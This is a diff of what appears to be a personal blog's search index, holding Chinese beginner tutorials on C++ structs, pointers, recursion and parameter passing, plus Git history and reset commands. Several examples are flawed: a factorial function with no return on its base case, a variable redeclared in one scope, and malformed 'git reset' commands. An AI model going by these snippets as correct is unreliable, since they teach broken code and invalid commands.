@@ -235,7 +235,7 @@
 
 <h1 id="结构体指针"><a href="#结构体指针" class="headerlink" title="结构体指针"></a>结构体指针</h1><p>作用：通过指针访问结构体中的成员</p>
 <p>利用操作符<code>-&gt;</code>可以通过结构体指针访问结构体属性</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">   <span class="comment">//1.创建学生结构体</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">student</span></span></span><br><span class="line"><span class="class">   &#123;</span></span><br><span class="line">       <span class="comment">//姓名</span></span><br><span class="line">       string name;</span><br><span class="line">       <span class="comment">//年龄</span></span><br><span class="line">       <span class="keyword">int</span> age;</span><br><span class="line">       <span class="comment">//分数</span></span><br><span class="line">       <span class="keyword">int</span> score;</span><br><span class="line">   &#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//2.创建结构体</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">student</span> <span class="title">s</span>=</span>&#123;<span class="string">&quot;张三&quot;</span>,<span class="number">18</span>,<span class="number">100</span>&#125;;</span><br><span class="line">    <span class="comment">//3.通过指针指向结构体变量</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">student</span> *<span class="title">p</span> =</span>&amp;s;</span><br><span class="line">    <span class="comment">//4.通过指针指向结构体变量</span></span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;name:&quot;</span>&lt;&lt;p-&gt;name&lt;&lt;<span class="string">&quot;\nage:&quot;</span>&lt;&lt;p-&gt;age&lt;&lt;<span class="string">&quot;\nscore:&quot;</span>&lt;&lt;p-&gt;score&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">   <span class="comment">//1.创建学生结构体</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">student</span></span></span><br><span class="line"><span class="class">   &#123;</span></span><br><span class="line">       <span class="comment">//姓名</span></span><br><span class="line">       string name;</span><br><span class="line">       <span class="comment">//年龄</span></span><br><span class="line">       <span class="keyword">int</span> age;</span><br><span class="line">       <span class="comment">//分数</span></span><br><span class="line">       <span class="keyword">int</span> score;</span><br><span class="line">   &#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//2.创建结构体</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">student</span> <span class="title">s</span>=</span>&#123;<span class="string">&quot;张三&quot;</span>,<span class="number">18</span>,<span class="number">100</span>&#125;;</span><br><span class="line">    <span class="comment">//3.通过指针指向结构体变量</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">student</span> *<span class="title">p</span> =</span>&amp;s;</span><br><span class="line">    <span class="comment">//4.通过指针指向结构体变量</span></span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;name:&quot;</span>&lt;&lt;p-&gt;name&lt;&lt;<span class="string">&quot;\nage:&quot;</span>&lt;&lt;p-&gt;age&lt;&lt;<span class="string">&quot;\nscore:&quot;</span>&lt;&lt;p-&gt;score&lt;&lt;endl;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;name:&quot;</span>&lt;&lt;(*p).name&lt;&lt;<span class="string">&quot;\nage:&quot;</span>&lt;&lt;(*p).age&lt;&lt;<span class="string">&quot;\nscore:&quot;</span>&lt;&lt;(*p).score&lt;&lt;endl;</span><br><span class="line">    <span class="comment">//以上两种输出方式等价</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <h1 id="结构体嵌套结构体"><a href="#结构体嵌套结构体" class="headerlink" title="结构体嵌套结构体"></a>结构体嵌套结构体</h1><p>作用：结构体中的成员可以是另一个结构体</p>
 <p>例如：每个老师辅导一个学生，一个老师的结构体中，记录一个学生的结构体</p>
@@ -335,6 +335,40 @@
 <p>setiosflags(ios::skipws)            忽略前导空白</p>
 <p>setiosflags(ios::uppercase)         16进制数大写输出</p>
 <p>setiosflags(ios::lowercase)         16进制小写输出</p>
+<h1 id="递归的简单使用"><a href="#递归的简单使用" class="headerlink" title="递归的简单使用"></a>递归的简单使用</h1><p>利用递归算阶乘</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">s</span><span class="params">(<span class="keyword">int</span> a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(a&gt;<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">int</span> b=a*<span class="built_in">s</span>(a<span class="number">-1</span>);</span><br><span class="line">		<span class="keyword">return</span> b;</span><br><span class="line">	&#125;	</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cout&lt;&lt;<span class="built_in">s</span>(<span class="number">4</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>法2</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">s</span><span class="params">(<span class="keyword">int</span> a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(a==<span class="number">1</span>)</span><br><span class="line">	<span class="keyword">return</span> a;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> a*<span class="built_in">s</span>(a<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cout&lt;&lt;<span class="built_in">s</span>(<span class="number">4</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <tags>
+        <tag>C++</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>C++的三种传值方式</title>
+    <url>/2022/04/06/C-%E7%9A%84%E4%B8%89%E7%A7%8D%E4%BC%A0%E5%80%BC%E6%96%B9%E5%BC%8F/</url>
+    <content><![CDATA[<h1 id="传值-按值传递"><a href="#传值-按值传递" class="headerlink" title="传值/按值传递"></a>传值/按值传递</h1><p><strong>值传递：</strong></p>
+<p>形参是实参的拷贝，<strong>改变形参的值并不会影响外部实参的值</strong>。从被调用函数的角度来说，值传递是单向的（实参-&gt;形参），<strong>参数的值只能传入，不能传出</strong>。当函数内部需要修改参数，并且不希望这个改变影响调用者时，采用值传递。</p>
+<span id="more"></span>
+
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">change1</span><span class="params">(<span class="keyword">int</span> a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cout&lt;&lt;<span class="string">&quot;The initial value in the function is:&quot;</span>&lt;&lt;a&lt;&lt;endl;</span><br><span class="line">	a=<span class="number">5</span>;</span><br><span class="line">	cout&lt;&lt;<span class="string">&quot;The final value in the function is:&quot;</span>&lt;&lt;a&lt;&lt;endl;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a=<span class="number">4</span>;</span><br><span class="line">	cout&lt;&lt;<span class="string">&quot;The initial value is:&quot;</span>&lt;&lt;a&lt;&lt;endl;;</span><br><span class="line">	<span class="built_in">change1</span>(a);</span><br><span class="line">	cout&lt;&lt;<span class="string">&quot;The final value is:&quot;</span>&lt;&lt;a&lt;&lt;endl;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="传地址-按地址传递-指针传递"><a href="#传地址-按地址传递-指针传递" class="headerlink" title="传地址/按地址传递/指针传递"></a>传地址/按地址传递/指针传递</h1><p><strong>指针传递：</strong></p>
+<p>形参为指向实参地址的指针，当对形参的指向操作时，就相当于对实参本身进行的操作，可以改变实参的值。其<strong>实质是传参</strong>，只不过这里的参数是一个指针。这里的指针比较特殊，可以当作参数使用。若将change2函数里的代码拿到main里面，却不能执行。</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">change2</span><span class="params">(<span class="keyword">int</span> *a)</span><span class="comment">//传地址/按地址传递 </span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;The initial value in the function is:&quot;</span> &lt;&lt; *a &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;The initial address in the function is:&quot;</span> &lt;&lt; a &lt;&lt; endl;</span><br><span class="line">	*a = <span class="number">3</span>;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;The final value in the function is:&quot;</span> &lt;&lt; *a &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;The final address in the function is:&quot;</span> &lt;&lt; a &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a=<span class="number">4</span>;</span><br><span class="line">	cout&lt;&lt;<span class="string">&quot;The initial value is:&quot;</span>&lt;&lt;a&lt;&lt;endl;</span><br><span class="line">	cout&lt;&lt;<span class="string">&quot;The initial address is:&quot;</span>&lt;&lt;&amp;a&lt;&lt;endl;</span><br><span class="line">	cout&lt;&lt;endl;</span><br><span class="line">	<span class="built_in">change2</span>(&amp;a);</span><br><span class="line">	cout&lt;&lt;endl;</span><br><span class="line">	cout&lt;&lt;<span class="string">&quot;The final value is:&quot;</span>&lt;&lt;a&lt;&lt;endl;</span><br><span class="line">	cout&lt;&lt;<span class="string">&quot;The final address is:&quot;</span>&lt;&lt;&amp;a&lt;&lt;endl;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>错误示例</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> *a;</span><br><span class="line">	*a=<span class="number">5</span>;</span><br><span class="line">	cout&lt;&lt;*a;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//执行完之后，返回结果为空</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>正确用法</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> *a;</span><br><span class="line">	<span class="keyword">int</span> b=<span class="number">5</span>;</span><br><span class="line">	a=&amp;b;</span><br><span class="line">	cout&lt;&lt;*a;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="传引用-按引用传递"><a href="#传引用-按引用传递" class="headerlink" title="传引用/按引用传递"></a>传引用/按引用传递</h1><p><strong>引用传递：</strong></p>
+<p>形参相当于是实参的“别名”，<strong>对形参的操作其实就是对实参的操作</strong>，在引用传递过程中，被调函数的形式参数虽然也作为局部变量在栈中开辟了内存空间，但是这时存放的是由主调函数放进来的实参变量的地址。<strong>被调函数对形参的任何操作都被处理成间接寻址，即通过栈中存放的地址访问主调函数中的实参变量</strong>。正因为如此，被调函数对形参做的任何操作都影响了主调函数中的实参变量。</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">change3</span><span class="params">(<span class="keyword">int</span> &amp;a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cout&lt;&lt;<span class="string">&quot;The initial value in the function is:&quot;</span>&lt;&lt;a&lt;&lt;endl;</span><br><span class="line">	a=<span class="number">5</span>;</span><br><span class="line">	cout&lt;&lt;<span class="string">&quot;The final value in the function is:&quot;</span>&lt;&lt;a&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a=<span class="number">4</span>;</span><br><span class="line">	cout&lt;&lt;<span class="string">&quot;The initial value is:&quot;</span>&lt;&lt;a&lt;&lt;endl;</span><br><span class="line">	<span class="built_in">change3</span>(a);</span><br><span class="line">	cout&lt;&lt;<span class="string">&quot;The final value is:&quot;</span>&lt;&lt;a&lt;&lt;endl;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
 ]]></content>
       <tags>
         <tag>C++</tag>
@@ -545,34 +579,6 @@
 <h2 id="数据的输入"><a href="#数据的输入" class="headerlink" title="数据的输入"></a>数据的输入</h2><p>作用：用于从键盘获取数据</p>
 <p>用法：<code>cin&gt;&gt; 变量</code></p>
 <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">0</span>;</span><br><span class="line">    cin&gt;&gt;a;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;你输入的数为&quot;</span>&lt;&lt;a&lt;&lt;endl;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">bool</span> b = <span class="literal">false</span>;</span><br><span class="line">    cin&gt;&gt;b;<span class="comment">//除了0之外的数字都是真的，字母是假的。若数字后面有字母，则直接看数字，若字母后面有数字，则就是假</span></span><br><span class="line">    cout&lt;&lt;b&lt;&lt;endl;</span><br><span class="line">    <span class="comment">//也可这样用</span></span><br><span class="line">    <span class="keyword">int</span> b,c,d;</span><br><span class="line">    cin&gt;&gt;b&gt;&gt;c&gt;&gt;d;</span><br><span class="line">    cout&lt;&lt;b&lt;&lt;c&lt;&lt;d;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <tags>
-        <tag>C++</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>C++的三种传值方式</title>
-    <url>/2022/04/06/C-%E7%9A%84%E4%B8%89%E7%A7%8D%E4%BC%A0%E5%80%BC%E6%96%B9%E5%BC%8F/</url>
-    <content><![CDATA[<h1 id="传值-按值传递"><a href="#传值-按值传递" class="headerlink" title="传值/按值传递"></a>传值/按值传递</h1><p><strong>值传递：</strong></p>
-<p>形参是实参的拷贝，<strong>改变形参的值并不会影响外部实参的值</strong>。从被调用函数的角度来说，值传递是单向的（实参-&gt;形参），<strong>参数的值只能传入，不能传出</strong>。当函数内部需要修改参数，并且不希望这个改变影响调用者时，采用值传递。</p>
-<span id="more"></span>
-
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">change1</span><span class="params">(<span class="keyword">int</span> a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cout&lt;&lt;<span class="string">&quot;The initial value in the function is:&quot;</span>&lt;&lt;a&lt;&lt;endl;</span><br><span class="line">	a=<span class="number">5</span>;</span><br><span class="line">	cout&lt;&lt;<span class="string">&quot;The final value in the function is:&quot;</span>&lt;&lt;a&lt;&lt;endl;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a=<span class="number">4</span>;</span><br><span class="line">	cout&lt;&lt;<span class="string">&quot;The initial value is:&quot;</span>&lt;&lt;a&lt;&lt;endl;;</span><br><span class="line">	<span class="built_in">change1</span>(a);</span><br><span class="line">	cout&lt;&lt;<span class="string">&quot;The final value is:&quot;</span>&lt;&lt;a&lt;&lt;endl;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h1 id="传地址-按地址传递-指针传递"><a href="#传地址-按地址传递-指针传递" class="headerlink" title="传地址/按地址传递/指针传递"></a>传地址/按地址传递/指针传递</h1><p><strong>指针传递：</strong></p>
-<p>形参为指向实参地址的指针，当对形参的指向操作时，就相当于对实参本身进行的操作，可以改变实参的值。其<strong>实质是传参</strong>，只不过这里的参数是一个指针。这里的指针比较特殊，可以当作参数使用。若将change2函数里的代码拿到main里面，却不能执行。</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">change2</span><span class="params">(<span class="keyword">int</span> *a)</span><span class="comment">//传地址/按地址传递 </span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;The initial value in the function is:&quot;</span> &lt;&lt; *a &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;The initial address in the function is:&quot;</span> &lt;&lt; a &lt;&lt; endl;</span><br><span class="line">	*a = <span class="number">3</span>;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;The final value in the function is:&quot;</span> &lt;&lt; *a &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;The final address in the function is:&quot;</span> &lt;&lt; a &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a=<span class="number">4</span>;</span><br><span class="line">	cout&lt;&lt;<span class="string">&quot;The initial value is:&quot;</span>&lt;&lt;a&lt;&lt;endl;</span><br><span class="line">	cout&lt;&lt;<span class="string">&quot;The initial address is:&quot;</span>&lt;&lt;&amp;a&lt;&lt;endl;</span><br><span class="line">	cout&lt;&lt;endl;</span><br><span class="line">	<span class="built_in">change2</span>(&amp;a);</span><br><span class="line">	cout&lt;&lt;endl;</span><br><span class="line">	cout&lt;&lt;<span class="string">&quot;The final value is:&quot;</span>&lt;&lt;a&lt;&lt;endl;</span><br><span class="line">	cout&lt;&lt;<span class="string">&quot;The final address is:&quot;</span>&lt;&lt;&amp;a&lt;&lt;endl;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>错误示例</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> *a;</span><br><span class="line">	*a=<span class="number">5</span>;</span><br><span class="line">	cout&lt;&lt;*a;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//执行完之后，返回结果为空</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>正确用法</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> *a;</span><br><span class="line">	<span class="keyword">int</span> b=<span class="number">5</span>;</span><br><span class="line">	a=&amp;b;</span><br><span class="line">	cout&lt;&lt;*a;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h1 id="传引用-按引用传递"><a href="#传引用-按引用传递" class="headerlink" title="传引用/按引用传递"></a>传引用/按引用传递</h1><p><strong>引用传递：</strong></p>
-<p>形参相当于是实参的“别名”，<strong>对形参的操作其实就是对实参的操作</strong>，在引用传递过程中，被调函数的形式参数虽然也作为局部变量在栈中开辟了内存空间，但是这时存放的是由主调函数放进来的实参变量的地址。<strong>被调函数对形参的任何操作都被处理成间接寻址，即通过栈中存放的地址访问主调函数中的实参变量</strong>。正因为如此，被调函数对形参做的任何操作都影响了主调函数中的实参变量。</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">change3</span><span class="params">(<span class="keyword">int</span> &amp;a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cout&lt;&lt;<span class="string">&quot;The initial value in the function is:&quot;</span>&lt;&lt;a&lt;&lt;endl;</span><br><span class="line">	a=<span class="number">5</span>;</span><br><span class="line">	cout&lt;&lt;<span class="string">&quot;The final value in the function is:&quot;</span>&lt;&lt;a&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a=<span class="number">4</span>;</span><br><span class="line">	cout&lt;&lt;<span class="string">&quot;The initial value is:&quot;</span>&lt;&lt;a&lt;&lt;endl;</span><br><span class="line">	<span class="built_in">change3</span>(a);</span><br><span class="line">	cout&lt;&lt;<span class="string">&quot;The final value is:&quot;</span>&lt;&lt;a&lt;&lt;endl;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 ]]></content>
       <tags>
@@ -886,6 +892,66 @@
       </tags>
   </entry>
   <entry>
+    <title>Git版本穿梭及版本比较</title>
+    <url>/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/</url>
+    <content><![CDATA[<h1 id="上节内容命令小结"><a href="#上节内容命令小结" class="headerlink" title="上节内容命令小结"></a>上节内容命令小结</h1><ul>
+<li><p>状态查看：<code>git status</code></p>
+</li>
+<li><p>添加操作：<code>git add 文件名.扩展名</code>（将工作区文件添加到暂存区）</p>
+</li>
+<li><p>提交操作：<code>git commit -m &quot;备注&quot; 文件名.扩展名</code>（将暂存区文件提交到本地库）</p>
+<span id="more"></span></li>
+</ul>
+<h1 id="查看历史记录"><a href="#查看历史记录" class="headerlink" title="查看历史记录"></a>查看历史记录</h1><p>查看历史版本：<code>git log</code></p>
+<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220109094308532.png" alt="image-20220109094308532"></p>
+<p>简洁显示：<code>git log --pretty=oneline</code></p>
+<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220109094600500.png" alt="image-20220109094600500"></p>
+<p>更简洁显示：<code>git log --oneline</code>（只显示后面版本）</p>
+<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220109094753040.png" alt="image-20220109094753040"></p>
+<p>显示指针移动步数：<code>git reflog</code>更加详细的历史记录</p>
+<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220109095213452.png" alt="image-20220109095213452"></p>
+<p>HEAD@{移动到当前版本所需要步数}</p>
+<p>若版本信息有多屏</p>
+<p>则空格向下翻页，b向上翻页，q退出</p>
+<h1 id="版本前进后退"><a href="#版本前进后退" class="headerlink" title="版本前进后退"></a>版本前进后退</h1><h2 id="基于索引值操作-推荐"><a href="#基于索引值操作-推荐" class="headerlink" title="基于索引值操作[推荐]"></a>基于索引值操作[推荐]</h2><p>命令：<code>git reset ---hard 开头哈希值（索引值）</code></p>
+<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220109100709122.png" alt="image-20220109100709122"></p>
+<p>选中了即复制了，直接右键Paste粘贴即可，前进后退都一样</p>
+<h2 id="使用-或-符号"><a href="#使用-或-符号" class="headerlink" title="使用^或~符号"></a>使用^或~符号</h2><p>只能往后退，不能往前</p>
+<p>命令：<code>git reset --hard HEAD^</code>（退一个版本）  <code>git reset --HEAD^^</code>（向后退两个版本）</p>
+<p>有几个”^“就退几个版本，或者<code>git reset --hard HEAD~n</code>后退n步</p>
+<h2 id="soft、mixed、hard参数的区别"><a href="#soft、mixed、hard参数的区别" class="headerlink" title="soft、mixed、hard参数的区别"></a>soft、mixed、hard参数的区别</h2><p>soft参数（不常用）：仅仅移动本地库指针（不改变本地库数据）</p>
+<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110111029305.png" alt="image-20220110111029305"></p>
+<p>mixed参数（不常用）：在本地库移动指针并且重置暂存区</p>
+<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110111040189.png" alt="image-20220110111040189"></p>
+<p>hard参数：在本地库移动指针、重置暂存区、重置工作区</p>
+<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110111056667.png" alt="image-20220110111056667"></p>
+<h1 id="永久删除文件后找回"><a href="#永久删除文件后找回" class="headerlink" title="永久删除文件后找回"></a>永久删除文件后找回</h1><p>创建一个新文件</p>
+<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110111643932.png" alt="image-20220110111643932"></p>
+<p>删除文件指令：<code>rm 文件名.扩展名</code></p>
+<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110111832475.png" alt="image-20220110111832475"></p>
+<p>现在状态为</p>
+<p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110111909833.png" alt="image-20220110111909833"></p>
